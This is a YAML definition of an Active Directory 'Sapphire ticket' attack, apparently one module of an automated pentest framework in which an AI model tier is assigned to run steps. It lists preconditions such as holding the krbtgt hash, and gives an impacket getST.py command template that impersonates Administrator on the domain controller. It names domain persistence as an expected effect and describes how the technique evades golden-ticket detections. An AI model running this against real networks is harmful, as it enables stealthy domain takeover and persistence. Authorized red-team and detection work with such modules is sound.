name: saphire_ticket
category: ad
description: "Sapphire ticket \u2014 S4U2self+U2U + krbtgt re-encrypt for stealthy forged TGT"
preconditions:
- has_krbtgt_hash
- has_cred
- domain_joined
parameters:
  target_ip: from_engagement.target_ip
  domain: from_engagement.domain
  krbtgt_hash: from_cred.krbtgt_nt_hash
  target_user: Administrator
command_template: getST.py -k -no-pass -self -altservice cifs/dc.{domain} -impersonate {target_user} '{domain}/{username}'
parser: impacket_parser
expected_effects:
- saphire_ticket_forged
- arbitrary_user_session
- domain_persistence
falsifier:
  pattern: KDC_ERR|KRB_AP_ERR|ACCESS_DENIED|denied
  timeout: 45
model_tier: sonnet
mechanism: "Request a TGS via S4U2self+U2U as a target user, then re-encrypt with the krbtgt key\nto forge a TGT. Lower forensic\
  \ footprint than golden ticket \u2014 the source TGS comes\nfrom a real KDC interaction, only the final re-encrypt is local.\
  \ Bypasses many\ngolden-ticket detections that look for TGT artifacts inconsistent with normal traffic.\n"
references:
  ocd_mindmap: 'Branch 13: Sapphire Ticket'
  hacktricks: windows-hardening/active-directory-methodology/silver-ticket.md
